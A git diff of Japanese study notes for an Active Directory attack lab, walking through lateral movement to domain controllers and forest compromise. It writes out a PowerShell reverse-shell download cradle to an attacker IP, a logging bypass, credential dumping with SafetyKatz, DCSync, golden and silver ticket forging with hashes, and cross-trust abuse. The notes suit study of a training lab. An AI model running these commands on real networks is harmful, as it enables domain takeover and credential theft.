@@ -107,7 +107,7 @@ Import-Module C:\AD\Tools\PowerHuntShares.psm1
 # ADMINS$,C$,AIが判明。隠しフォルダでないAIを探す
 Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt	
 ```
-・ブラウザでSMBShareを開きInsecure ACEsを見ればAIフォルダがdcorp-ciにあることが分かる(環境の状態によっては表示されないので注意)
+ブラウザでSMBShareを開きInsecure ACEsを見ればAIフォルダがdcorp-ciにあることが分かる(環境の状態によっては表示されないので注意)
 
 
 ====================================================================
@@ -148,12 +148,12 @@ Invoke-PrivescCheck			# StatusがVulnerable - Highを探す
 # ラテラルムーブメント（横移動）
 
 ## BloodHoundを使用した分析(P11)LO-1
-・管理者としてコマンドプロンプト起動
-・Blood-Hound-win32-x64からBloodHound起動
+管理者としてコマンドプロンプト起動
+Blood-Hound-win32-x64からBloodHound起動
 ```bash
 C:\AD\Tools\BloodHound-masterollectors\SharpHound.exe --collectionmethods
 ```
-・WebUI版で最短経路を確認する。
+WebUI版で最短経路を確認する。
 今回はdcorp-ciから調査する。
 
 
@@ -166,7 +166,7 @@ nmap 172.16.3.11 -Pn -sV -T4
 
 nmap 172.16.3.11 -p 8080 -Pn -A -T5	# titleからJenkinsが判明
 ```
-・ブラウザでhttp://172.16.3.11:8080にアクセス
+ブラウザでhttp://172.16.3.11:8080にアクセス
 
 
 ## Jenkinsを使用したdcorp-ciへの移動(P39)LO-5
@@ -178,16 +178,16 @@ nmap 172.16.3.11 -p 8080 -Pn -A -T5	# titleからJenkinsが判明
 ```bash
 # ()内のコマンドをメモリ上で即時実行
 powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.48 -Port 443	
-・ iex: Invoke-Expressionのエイリアス。()内をメモリに読み込み。
-・ iwr: Invoke-WebRequestのエイリアス。Webコンテンツを取得する。
-・ UseBasicParsing: InternetExplorerを使わずシンプルな読み込み。JSが動くのを防止
-・ ;はコマンド連結
-・ Power: Invoke-PowerShellTcp内で定義されたリバースシェル関数。
-・ Reverse: 標的から攻撃者に接続
-・ IPAddress: C2サーバー
-・ Port: 443でHTTPSを偽装しFW回避
 
-
+# 以下解説
+# iex: Invoke-Expressionのエイリアス。()内をメモリに読み込み。
+# iwr: Invoke-WebRequestのエイリアス。Webコンテンツを取得する。
+# UseBasicParsing: InternetExplorerを使わずシンプルな読み込み。JSが動くのを防止
+# ;はコマンド連結
+#  Pdower: Invoke-PowerShellTcp内で定義されたリバースシェル関数。
+# Reverse: 標的から攻撃者に接続
+# IPAddress: C2サーバー
+# Port: 443でHTTPSを偽装しFW回避
 ```
 ・HFSを起動しダウンロードさせるファイルを準備
 ・netcatで接続を待ち受け
@@ -198,14 +198,19 @@ powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicP
 
 ```bash
 
-# 拡張ログ（P/S実行内容を記録する監査ログ）をバイパス
+# 拡張ログ（P/S実行内容を記録する監査ログ）をバイパス(.ps1は検知されるので.txtとして検知回避する。中身はPowerShellスクリプトなのでIEXコマンドで読み込ませて実行する)。PowerShellの内部設定を管理しているメモリに直接アクセスしログ記録のフラグを書き換えている。
 iex (iwr http://172.16.100.48/sbloggingbypass.txt -UseBasicParsing)	
 
 # 次のコマンドはDefenderで検知ブロックされる(メモリ内実行)
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))	
 
+# 上記コマンドの解説
+# New-Object:　新しいオブジェクトを作るコマンド(後続のコマンドをインスタンス化)
+# Net.WebClient.DownloadString:　WebClient起動しURLから文字列を取得する(PowerViewの中身)
+
+
 # 再度コマンド実行
-・iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))
 
 # どの端末にDAがいるか調べるコマンド。数分かかる
 Find-DomainUserLocation		
@@ -221,8 +226,8 @@ winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 # Loader.exeをダウンロード。Loader.exeはローダー実行ファイル
 iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe		
 
-# Loader.exeをターゲット(dcorp-mgmt)に配送
-echo F | xcopy C:\Users\Public\Loader.exe  \\dcorp-mgmt\C$\Users\Public\Loader.exe	
+# Loader.exeをターゲット(dcorp-mgmt)に配送.echo Fは上書き確認に対する自動応答。sudo apt install hoge -Yと同じようなもの。-Fはファイルとして保存。-Dはフォルダとして保存
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe	
 
 # $nullは外部コマンド実行時の起動バナー等不要表示を出力しないようにするためにつけている。
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"	
@@ -234,17 +239,22 @@ j$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127
 
 ## クレデンシャルを使用しdcorp-dcにアクセス
 
-・新しいコマンドプロンプトを開始
+新しいコマンドプロンプトを開始
 ```bash
+# RubeusはKeroberouｓ認証を悪用して権限昇格や横展開を行うツール
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
-・管理者権限が必要と怒られるので管理者で実行する
-・新しいプロンプト画面が表示される
+管理者権限が必要と怒られるので管理者で実行する
+新しいプロンプト画面が表示される
 ```bash
 winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
 ```
-・何も表示されない場合コマンド実行は成功しているが表示に不具合がある
-・winrs -r:dcorp-dc cmdで接続できることを確認。見事DCまで侵入できた。
+※ 何も表示されない場合コマンド実行は成功しているが表示に不具合がある
+```bash
+# cmdで接続できることを確認
+winrs -r:dcorp-dc
+# 見事DCまで侵入できた。
+```
 
 
 ===============================================================================
@@ -253,32 +263,42 @@ winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
 
 ## 秘密の抽出(P62)LO-8
 
-・管理者としてコマンドプロンプトを起動
+管理者としてコマンドプロンプトを起動
 ```bash
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt	# DA権限を持つプロンプトが起動
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt	
+# DA権限を持つプロンプトが起動
 
-echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y	# Loaderをdcに配置
+# Loaderをdcに配置
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y	
 
-winrs -r:dcorp-dc cmd		# dcに接続
-
+# dcに接続
+winrs -r:dcorp-dc cmd		
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48	# ポートフォワード設定
 
-C:\Users\Public\Loader.exe --obfuscate false -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"	# 文字化けが発生するときはHFSを起動していないか学生VMのファイアーウォールがONになっている。
+C:\Users\Public\Loader.exe --obfuscate false -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"	
+# 文字化けが発生するときはHFSを起動していないか学生VMのファイアーウォールがONになっている。
+
 ```
 ・秘密情報を入手
-　悪用シナリオ	①他端末の認証に使用（pass the hash） ②NTLMリレー　③パスワードクラック（John）
+　悪用シナリオ
+1. 他端末の認証に使用（pass the hash） 
+2. NTLMリレー　
+3. パスワードクラック（John）
 
 
 ## ゴールデンチケット攻撃(P63)LO-8
 ・DA権限を持つプロンプトに移動
 ```bash
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"		# DCSync攻撃でkrbtgtのハッシュを取得
 
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd	# ゴールデンチケット偽装（AES256は直前のDCSyncで入手）※変な表示が出るときは再ログインする（チケットが多すぎることによるエラー）
+# DCSync攻撃でkrbtgtのハッシュを取得
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"		
 
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local AlteredSecurity Attacking and Defending Active Directory 65 /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt	# 表示されたコマンドに-path C:\AD\Tools\Rubeus.exe -argsと/pttを追記している
+# ゴールデンチケット偽装（AES256は直前のDCSyncで入手）※変な表示が出るときは再ログインする（チケットが多すぎることによるエラー）
+# ゴールデンチケットはあらゆるユーザーになりすましができる偽装チケット
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd	
 
-winrs -r:dcorp-dc cmd
+# 表示されたコマンドに-path C:\AD\Tools\Rubeus.exe -argsと/pttを追記している
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local AlteredSecurity Attacking and Defending Active Directory 65 /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt	winrs -r:dcorp-dc cmd
 
 set username
 
@@ -287,10 +307,15 @@ set computername
 ```
 
 
-
+## その他の永続化として以下のようなものがある。
 ## シルバーチケット攻撃
+TGSを偽装する攻撃。そのハッシュを持つ特定のサービスに対してのみ有効
+DCと通信しないためログに残らない。対してゴールデンチケットはDC側でTGS要求履歴が残るのに対応するTGT発行ログがない不自然なログが記録される。
 ## ダイアモンドチケット攻撃
-## エージェント型ならスケジュールタスク、レジストリ実行キー、スタートアップフォルダ、COMオブジェクトがある。
+ダイアモンドチケットは正規のTGTを復号し内容を改ざんしたあと再暗号化したもの。正規プロセスにより発行され、時間が正確でログに不自然なギャップがないため検知が難しい。
+## スケルトンキーを使った永続化(検知されやすい上、AD証明書サービスに問問を引き起こす可能性がある)
+DCのLSASSプロセスにパッチを当てることであらゆるユーザーでログインできるようになる。実行にはDA権限が必要。メモリに存在するためDCが再起動すると効果が失われる
+## エージェント型ならスケジュールタスク、レジストリ実行キー、スタートアップフォルダ、COMオブジェクト(部品のように使えるプログラムの塊)がある。
 
 
 ================================================================================
@@ -305,20 +330,26 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin 
 ```
 ・新しいプロンプトが開く
 ```bash
-echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y		# Loaderを配置
 
-winrs -r:dcorp-dc cmd	# DCに接続
+# Loaderを配置
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y		
+# DCに接続
+winrs -r:dcorp-dc cmd	
 
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48	# ポートフォワード追加
+# ポートフォワード追加
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48	
 
-C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"		# rc4のハッシュを取得
+# rc4のハッシュを取得
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"		
 ```
-・新しいコマンドプロンプト画面を起動する
+新しいコマンドプロンプト画面を起動する
 ```bash
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:bf829c994cc5f43fcbc870c9654bc9d5 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap	# SIDヒストリを含むチケットを作成
 
+# SIDヒストリを含むチケットを作成
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:bf829c994cc5f43fcbc870c9654bc9d5 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap	
 
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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		# 使用しているRC4に間違いがないのにKRBERROR(31)が発生する場合はメールする。
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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		
+# 使用しているRC4に間違いがないのにKRBERROR(31)が発生する場合はメールする。
 
 winrs -r:mcorp-dc.moneycorp.local cmd
 
@@ -341,17 +372,18 @@ set username
 
 set computername
 ```
-・追加でDCSync攻撃をする場合は以下のコマンド
+追加でDCSync攻撃をする場合は以下のコマンド
 ```bash
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
-・全ハッシュ入手！
+
+# 全ハッシュ入手！
 
 ```
 
 ## 外部信頼を悪用(P101)LO-20
 
-・管理者権限でコマンドプロンプトを起動
-・(DA権限を持つプロンプトが起動していれば以下コマンドは省略可能)
+管理者権限でコマンドプロンプトを起動
+(DA権限を持つプロンプトが起動していれば以下コマンドは省略可能)
 ```bash
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 
@@ -366,9 +398,12 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsa
 
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:5c83b026f7591aec55034cb8bd50b496 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
 
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGFjCCBhKgAwIBBaEDAgEWooIE4jCCBN5hggTaMIIE1qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBH4wggR6oAMCARehAwIBA6KCBGwEggRo/Em77dOaKlY3EOup5HSLO1f01bt9sKlck4Uc7zBiIrwca44rUQNlGGPei+6jb+51ctEw+7ORiSXEk1ft3+W5HASSLqMh4yZJX+GcIjEYX9/v13eItqAxsrS+gWqfmZUEVLJBGX3ity4djk/vX52mKibjsj+bX0+K15wUHW29qKHsVStM7SeE26GPFKiwKdgYe1dixYoq6ZcuFRpQEH+0LuE/FSnFyqJJBapycxwJQUxU19PvU3c/nX/XfrMZu713guNnoNJqE8eZn9tx9AQD7VD2GtG+vBqIcxZMhudN6kXd02fjJkn2NOaZEf4+wzo6JhNytCjZELGaP/EWaphMFtEFxlzVMqSMfPLJugeRHu5GcpnHfk7I0wSWpai3m5iu6xSNjn+nP1zpVCDgsbVnLmM6/bxfzMLXqxmOaHUFeRjTIo+z/WbX5X+hTXf1xdK6u/fVi6e6lDQfIHlW1Az9Qb+EBArQBFOiSEo0Of4UhQR3QsikRa08L3CgFSCbLWClHIIOZeJM/CxxFu0Fh1JkEPQbEOOIRcpwxCddWhe2S3NNj7j+C44DcMmkh1sFHL2VMCX1Ru9h/6WgDtEn1YW2i3XiMrK60YRxO8QW1JPqAg4EPT8LMLVWI3QqRzP5353gAqUFpLxibBIvTgsE6IUGOGuVWqdPpxY1uN//rTIyiIOKI/W0VxrLlC8vyuSmiX86cy9Jc1Myw4V4EggTDkj0iewtbCOs1Em0rpd0o3HNxxup9mNKZDh79SslHGRdT+2TCfrGdmmotLam0K3Fe0yW6mmAvrBWLtNX+YQl0rC9OorKQsHR2O6iAFe1tcD/4Wi78uoBG0fCIhd1RCpcBE80OJewYRMWR1M3QlS2+m7I+RT/yftKvDwJDuTHTs/etnhMlYXeXrql5PYZ6GTq48T5Zj07k+uSjseswwptc1TmyQKa/GaMk+e+5rAkhtCGNlnvNpfL+2k1DfKyUyrqYok87MyRC15Gz0JlT8SZmKK6dWWwES66aviRjJV95nL9nr2BeAuLlGIJPxnjvCkiPTi3HTszHw7wXxoz31DanuNxF3UUeX5xeuqcrqskQi+4yHz2jklPxvO+BkbJgiJmNgC5+TZMN0jYRUsZqgPQ38trDDjYaMNlVUgKcwRmOQfwXiAhsqOnw6NuKmQTBSYSgjoH4Y5WbTX2/bcrVNFSFdyG/2GZRgbNKjxNffsRoo1EpTMcvN254EkZlz4u9f58g6sW+s/DfWwulpYFjTl6Jxe/4Xjo/M4Wxg2nJj8NoaXUKy0mfYo7GQeksNFchNqbpRAE+w7CpcW+GgxAjxY8MQhk8dqJU0Fnp+qfLyRtDUEU+E8Gxug39SA968TaiPrVJkP3XjzYbAIzL3cgW09M89LooAyvpIk0VsnDnL88UJqQGj5RcL6z4VlYMn+RL1WdQld5fcrvTwrAFsGRLVKhoiGCNtMRosgP6gug9sx9iaghYDc7tgntYdvhKmxq9DK4AVUTGSkk1c1x41pNo4IBHjCCARqgAwIBAKKCAREEggENfYIBCTCCAQWgggEBMIH+MIH7oBswGaADAgEXoRIEENecUduvdz8TQSjF1sTS8rChHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjYwMTA3MTIzNDM1WqURGA8yMDI2MDEwNzEyMzQzNVqmERgPMjAyNjAxMDcyMjM0MzVapxEYDzIwMjYwMTE0MTIzNDM1WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=		# 使用しているRC4に間違いがないのにKRBERROR(31)が発生する場合はメールする。
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGFjCCBhKgAwIBBaEDAgEWooIE4jCCBN5hggTaMIIE1qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBH4wggR6oAMCARehAwIBA6KCBGwEggRo/Em77dOaKlY3EOup5HSLO1f01bt9sKlck4Uc7zBiIrwca44rUQNlGGPei+6jb+51ctEw+7ORiSXEk1ft3+W5HASSLqMh4yZJX+GcIjEYX9/v13eItqAxsrS+gWqfmZUEVLJBGX3ity4djk/vX52mKibjsj+bX0+K15wUHW29qKHsVStM7SeE26GPFKiwKdgYe1dixYoq6ZcuFRpQEH+0LuE/FSnFyqJJBapycxwJQUxU19PvU3c/nX/XfrMZu713guNnoNJqE8eZn9tx9AQD7VD2GtG+vBqIcxZMhudN6kXd02fjJkn2NOaZEf4+wzo6JhNytCjZELGaP/EWaphMFtEFxlzVMqSMfPLJugeRHu5GcpnHfk7I0wSWpai3m5iu6xSNjn+nP1zpVCDgsbVnLmM6/bxfzMLXqxmOaHUFeRjTIo+z/WbX5X+hTXf1xdK6u/fVi6e6lDQfIHlW1Az9Qb+EBArQBFOiSEo0